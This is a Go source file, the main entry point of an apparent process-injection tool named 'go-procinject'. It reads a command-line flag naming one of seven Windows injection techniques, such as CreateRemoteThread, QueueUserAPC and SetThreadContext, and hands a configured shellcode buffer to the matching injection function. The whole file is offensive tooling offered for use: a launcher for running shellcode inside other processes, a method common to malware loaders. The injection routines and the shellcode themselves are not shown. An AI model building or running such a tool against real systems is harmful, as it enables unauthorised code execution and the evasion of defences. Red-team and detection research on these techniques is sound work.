package main

import (
	"flag"
	"fmt"
	"go-procinject/config"
	"go-procinject/inject"
)

func main(){
	var technique string
	flag.StringVar(&technique, "technique", "", "Process injection technique:\n" +
		"CreateRemoteThread\n" +
		"NtCreateRemoteThread\n" +
		"QueueUserAPC\n" +
		"NtQueueUserAPC\n" +
		"RtlCreateUserThread\n" +
		"SetThreadContext\n" +
		"SetThreadContextC\n")
	flag.Parse()

	switch technique{
	case "CreateRemoteThread":
		inject.CreateRemoteThread(config.Shellcode)
		break
	case "NtCreateRemoteThread":
		inject.NtCreateRemoteThread(config.Shellcode)
		break
	case "QueueUserAPC":
		inject.QueueUserAPC(config.Shellcode)
		break
	case "NtQueueUserAPC":
		inject.NtQueueUserAPC(config.Shellcode)
		break
	case "RtlCreateUserThread":
		inject.RtlCreateUserThread(config.Shellcode)
		break
	case "SetThreadContext":
		inject.SetThreadContext(config.Shellcode)
		break
	case "SetThreadContextC":
		inject.SetThreadContextC(config.Shellcode)
		break
	default:
		fmt.Println("Invalid process injection technique")
		break
	}
}